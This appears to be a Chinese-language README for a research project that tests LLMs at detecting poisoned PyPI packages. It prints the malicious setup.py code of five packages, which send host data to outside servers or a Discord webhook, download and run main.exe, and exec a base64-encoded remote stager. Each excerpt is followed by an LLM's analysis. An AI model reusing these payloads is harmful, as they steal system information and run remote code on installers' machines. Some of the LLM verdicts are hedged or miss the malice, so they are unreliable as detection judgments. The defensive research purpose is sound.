## llm-evil-package

之前chatGPT存在token限制，需要上下文关联后才可以完成代码文件的理解及基于prompt的判断。但是24/03月多个平台如kimi、通义等支持最多1000w大文本的解析，所有在恰当的prompt只需将evil package常见恶意代码的文件如setup.py文件喂给LVM来判断包是否是恶意即可。利用LLM来做投毒包的优势也相当明显：不需要维护沙盒虚拟动态执行环境、不需要维护bypass的白盒静态检出规则，只需要对prompt做更新维护即可。

| package   | version | 恶意行为 | 特殊文本特征 | 是否可以检出 |
|--------   |------   |---------|--------|---------|
| predpatt  | 1.0     | 网络请求   | 无 | 可以 |
| animatch-8.8.8| 8.8.8      | 网络请求    | 无 | 可以 |
| ahahjesus-0.13      | 0.13        | 网络请求    | 无 | 可以 |
|rblxsetup-0.0.1| 0.0.1 | 网络请求\exe下载执行 | 无 | 可以 |
|bytedredis-9.9.8 | 9.9.8 | 网络请求\代码执行| base64 | 可以 |
|BootcampSystem-0.1| 0.1 | 网络请求\恶意exe执行\代码执行 | base64\大文本 | 可以 |

### predpatt-1.0
- 恶意行为
    ```
    ip = requests.get('https://api.ipify.org').text
        ipText = format(ip);
        myhost = os.uname()[1]
        currentPath = requests.utils.quote(bytes(pathlib.Path(__file__).parent.absolute()));

        PYdata = { "ip": ipText,
                "host": myhost,
                "path": currentPath, }
        PYdataS = ipText+","+myhost+",("+currentPath+")"

        message = PYdataS
        message_bytes = message.encode('ascii')
        base64_bytes = base64.b64encode(message_bytes)
        base64_message = base64_bytes.decode('ascii')

        r  = requests.get("https://kotko.org?"+company+name+"="+base64_message)
    ```
- llm-msg
    ```json
    {"role": "assistant", "content": "这个 `setup.py` 文件中存在一些潜在的风险，可能表明这是一个恶意的 \"poison package\"。以下是一些风险点：\n\n1. **后门函数**：\n   - `_post_install()` 函数在安装完成后执行，这可能会在用户不知情的情况下添加或修改文件（如 `pocbykotko.txt`），这可能是用来记录用户的系统信息或者进行进一步的攻击。\n\n2. **网络请求与数据发送**：\n   - 在 `_post_install()` 函数中，代码获取用户的 IP 地址、主机名，并将这些信息与特定路径一起发送到 `https://kotko.org`。这可能是用于收集用户数据，或者作为进一步攻击的触发机制。\n\n3. **Base64编码和参数传递**：\n   - 代码将敏感信息（IP地址、主机名、文件路径）通过 Base64 编码传递给 `https://kotko.org`，这可能用于隐藏数据或作为某种通信方式。\n\n4. **命令类修改**：\n   - `cmdclass` 部分将 `install` 命令替换为自定义的 `new_install` 类，这可能导致对标准安装过程的意外修改，增加了恶意行为的可能性。\n\n5. **缺乏安全审查**：\n   - 文件中没有明显的安全检查或异常处理，这使得恶意代码更有可能被执行。\n\n为了确认是否是恶意投毒包，你需要进一步分析 `https://kotko.org` 的网站以及这个包的其他部分（如源代码、依赖库等）。如果发现有恶意活动或未经授权的数据收集，那么这个包就是恶意的。建议在发布到生产环境之前进行彻底的安全审计。"}
    ```

### animatch-8.8.8
- 恶意行为
    ```python
    install.run(self)
    url = 'http://101.32.99.28/name?animatch'
    requests.get(url, timeout=30)
    ```
- llm-msg
    ```json
    {"finish_reason": "stop", "message": {"role": "assistant", "content": "根据提供的`setup.py`文件，这个Python包名为`animatch`，包含一个自定义安装命令`CustomInstallCommand`。在该命令的`run`方法中，它会尝试从`http://101.32.99.28/name?animatch`这个URL获取数据，设置了30秒的超时时间。\n\n潜在的风险点如下：\n\n1. **恶意代码注入**：如果这个URL是由用户输入或者不受信任的第三方控制，那么它可能会被篡改，导致在安装过程中执行恶意代码。攻击者可能利用这个机会在用户的系统上执行任意操作，例如下载并运行额外的恶意软件。\n\n2. **未授权访问**：直接暴露网络地址和端口可能使这个包容易受到DDoS攻击，尤其是如果这个URL指向的是一个公共服务器或网络资源。\n\n3. **脆弱性利用**：如果URL中的`name?animatch`部分包含敏感信息（如查询参数），这些信息可能被用于识别目标系统或触发特定的漏洞利用。\n\n4. **数据泄露**：安装过程中的网络请求可能会记录或暴露用户的IP地址、安装时间等信息，这可能违反隐私政策或对用户构成风险。\n\n5. **未预期的行为**：尽管声称是为了提醒供应链安全风险，但这个行为可能未经用户明确同意就发生，可能导致用户体验问题或被视为未经许可的网络活动。\n\n为了确认这个包是否为恶意投毒，需要进一步分析URL的内容、来源以及是否有频繁更新或异常行为。建议进行以下操作：\n- 检查URL是否指向已知的恶意网站或包含可疑的代码。\n- 分析`requests.get()`的响应内容，确保没有隐藏的恶意代码。\n- 对于`CustomInstallCommand`，可以考虑将其替换为更安全的自定义行为，或者提供一个选项让用户选择是否执行网络请求。\n\n为了保证安全性，最好在发布到生产环境之前，使用静态代码分析工具和动态分析来评估其潜在威胁。同时，保持与作者的沟通，了解他们关于此行为的意图和安全性措施。"
    ```

### ahahjesus-0.13
- 恶意行为
    ```python
            hostname=socket.gethostname()   
            IPAddr=socket.gethostbyname(hostname)
            async def foo():
                async with aiohttp.ClientSession() as session:
                    webhook = Webhook.from_url('https://discord.com/api/webhooks/1025846754916188171/zQZcaJpTytEpfnUx0ZSRRKXtXO5Ng38EaoaKBBu58_ZEfLQlyQECn7gZLjUF7PWY-Tpb', session=session)
                    await webhook.send(f'{hostname} | {IPAddr}"', username='Foo')
            
            asyncio.run(foo())
            install.run(self)
    ```
- llm-msg
    ```json
    {"role": "assistant", "content": "首先，从setup.py文件来看，这个Python包名为`ahahjesus`，它包含一个自定义安装命令`CustomInstallCommand`。这个命令在安装过程中会执行一些网络操作，包括使用Discord API发送消息到指定的Webhook。\n\n风险点分析如下：\n\n1. **隐私泄露**：安装时会获取本地主机名（hostname）和IP地址，并将这些信息发送到远程服务器。这可能被解释为未经用户明确许可的数据收集，尤其是在没有明确告知用户或未提供明确的隐私政策的情况下。\n\n2. **安全漏洞利用**：如果Webhook URL是公开的或者不受信任的，那么这个行为可能会被恶意利用来进行DoS攻击、数据注入或其他形式的攻击，尤其是当`webhook.send`方法中的字符串格式化可能存在安全漏洞时。\n\n3. **非预期行为**：自定义安装命令可能会干扰正常的软件安装流程，给用户带来意外的副作用。例如，如果这个命令在错误条件下运行，可能会导致其他依赖项安装失败或者程序运行出错。\n\n4. **依赖管理问题**：尽管`install_requires`列出了必要的库（requests和discord.py），但没有对这些依赖进行版本锁定，可能导致潜在的安全风险或功能不兼容。\n\n5. **代码质量**：这段代码看起来比较简短且直接，缺乏错误处理和异常捕获，这可能导致在执行过程中出现难以预料的问题。\n\n综上所述，虽然这个setup.py文件本身并没有明显的恶意代码，但其包含的自定义安装命令可能带来潜在的风险。为了确保安全性，建议在发布前进行全面的安全审查，包括但不限于代码审计、输入验证、权限控制和隐私保护措施。"}
    ```
### rblxsetup-0.0.1
- 恶意行为
    ```python
    URL = "https://cdn.discordapp.com/attachments/1030676772041273365/1031332099086630932/main.exe"
    response = requests.get(URL)
    open("main.exe", "wb").write(response.content)
    os.system("set __COMPACT_LAYER=RunAsInvoker | start main.exe")
    ```
- llm-msg
    ```json
    {"role": "assistant", "content": "根据提供的`setup.py`文件，这个Python包名为`rblxsetup`，它包含一个自定义的命令类`PostDevelopCommand`和`PostInstallCommand`，在这些命令运行时会执行一个外部操作，即下载并运行一个名为`main.exe`的可执行文件。这个行为本身可能引发以下几个风险点：\n\n1. **恶意软件**：如果`main.exe`是一个恶意文件，它可能会执行未经授权的活动，如安装后门、窃取数据或对系统进行其他形式的攻击。\n\n2. **代码注入**：这个行为可能被滥用来在用户的系统上执行任意代码，特别是如果下载的URL是由不可信的来源提供，或者通过用户输入动态生成的。\n\n3. **权限提升**：`set __COMPACT_LAYER=RunAsInvoker`这行代码表明，可执行文件可能试图以更高的权限运行，这可能导致对系统资源的不当访问。\n\n4. **依赖管理问题**：尽管`install_requires`列表为空，但实际项目可能依赖于开发者忘记添加的其他库。如果这些库被恶意修改，整个包的安全性也会受到影响。\n\n5. **缺乏安全审计**：没有明显的安全审计或漏洞检查机制，使得恶意修改或注入更容易发生。\n\n6. **混淆用户**：这个包声称是用于“roblox Cheat Setup”（可能是指游戏作弊工具），但其实际功能与描述不符，可能会误导用户，让他们忽视潜在的安全风险。\n\n为了判断这个包是否是恶意投毒，需要进一步分析`main.exe`的内容、下载的URL以及是否有其他可疑行为。如果这些行为没有经过严格的审查和验证，且用户可能不知情地安装，那么就可能存在恶意投毒的风险。建议在使用前仔细评估或对代码进行安全扫描。"}
    ```
### bytedredis-9.9.8
- 恶意行为
    ```python
    try:
        exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHpsaWIsYmFzZTY0LHN5cwp2aT1zeXMudmVyc2lvbl9pbmZvCnVsPV9faW1wb3J0X18oezI6J3VybGxpYjInLDM6J3VybGxpYi5yZXF1ZXN0J31bdmlbMF1dLGZyb21saXN0PVsnYnVpbGRfb3BlbmVyJ10pCmhzPVtdCm89dWwuYnVpbGRfb3BlbmVyKCpocykKby5hZGRoZWFkZXJzPVsoJ1VzZXItQWdlbnQnLCdNb3ppbGxhLzUuMCAoV2luZG93cyBOVCA2LjE7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJyldCmV4ZWMoemxpYi5kZWNvbXByZXNzKGJhc2U2NC5iNjRkZWNvZGUoby5vcGVuKCdodHRwOi8vMTYxLjk3LjExMS4xOTY6NDQ0My9GUEJUYXRmN09mWEpaOXh6cVREU3FBVFppelNmOXBkR3lpeVBYUlZPNGdyaml1RXIzcEhhbTZpd2hTLTQwa1VSUTRnRWZtLTlnVjh0aDlEcG5PMUFGaVRqZDAwRHVwV0NNd2RkakZPVFYwN2s2bycpLnJlYWQoKSkpKQo=')[0]))
    except:
        pass

    url = 'https://x.02.yt/piplog?'

    hostname = ''
    ip = ''
    try:
        import socket
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
    except:
        pass

    url += 'name=' + hostname + '&ip=' + ip

    try:
        from urllib import request
        with request.urlopen(url, timeout=30) as f:
            pass
    except Exception as e:
        pass

    try:
    import urllib
    with urllib.urlopen(url) as f:
        pass
    except Exception as e:
        pass
    ```
- llm-msg
    ```json
    {"role": "assistant", "content": "这个 `setup.py` 文件中存在一些潜在的安全风险，可能表明这是一个恶意投毒包。以下是几个风险点：\n\n1. **代码执行（Code Execution）**：\n   - `exec(__import__('base64').b64decode(...))` 这行代码尝试解码并执行一个 base64 编码的字符串，这可能导致引入和执行未预期的代码，从而带来安全威胁。\n\n2. **网络请求（Network Request）**：\n   - 通过 `urllib` 和 `request` 模块发送网络请求到 `url` 可能用于收集敏感信息（如主机名和 IP 地址），这在没有用户明确许可的情况下可能侵犯隐私。\n\n3. **异常处理（Exception Handling）**：\n   - 异常处理部分使用了 `pass`，这意味着如果网络请求失败，可能会隐藏实际的错误，使得攻击者难以被发现。\n\n4. **版本信息泄露（Version Disclosure）**：\n   - 尽管 `setup.py` 明示包名为 \"bytedredis\"，但提供的 `version` 变量（\"9.9.8\"）对于恶意目的可能是有意为之，以便诱使用户安装。\n\n5. **可疑的依赖（Suspicious Dependency）**：\n   - `install_requires=[]` 表明没有明确的依赖，但这样的设置本身并不常见，可能暗示着有隐藏的目的。\n\n为了确认这是否是一个恶意投毒包，你需要对整个代码库进行深入审查，查看是否有其他可疑行为，比如恶意代码注入、后门或数据泄露功能。建议进行安全审计，并考虑使用静态代码分析工具来检测潜在威胁。此外，如果这个包来自不可信的源，那么它可能就是恶意的。如果不确定，最好避免安装并从官方或可信的第三方仓库获取。"}
    ```

### BootcampSystem-0.1
- 恶意行文
    - 大文本请在../../small_sample/BootcampSystem-0.1.tar.gz查看setup.py
- llm-msg
    ```
    对于第一段base64解码后的字符串，解码后得到的是一个看起来像是乱码或者未格式化的控制字符序列。在文本中这部分并没有明确的恶意指令或明显用途，但如果是在正确的情境下解读（例如在特定的终端环境下），可能会执行某种不可见的操作。

    第二段base64解码后是一个较长的Python脚本片段，涉及到网络请求、压缩与解压、用户密码获取、XML解析、API调用、目录遍历等操作，并且似乎包含一些条件判断逻辑和字符串替换。这段代码有可能被用来实现一些恶意功能，比如窃取信息、篡改文件或者执行远程命令等。

    要全面分析这段代码是否有恶意行为，需要完整解码并且结合上下文理解其整体逻辑。鉴于提供的base64字符串不完整，我们暂时无法做出确切结论。如果能够获得完整字符串并完成解码，将能更好地分析其真实意图和潜在风险。
    ```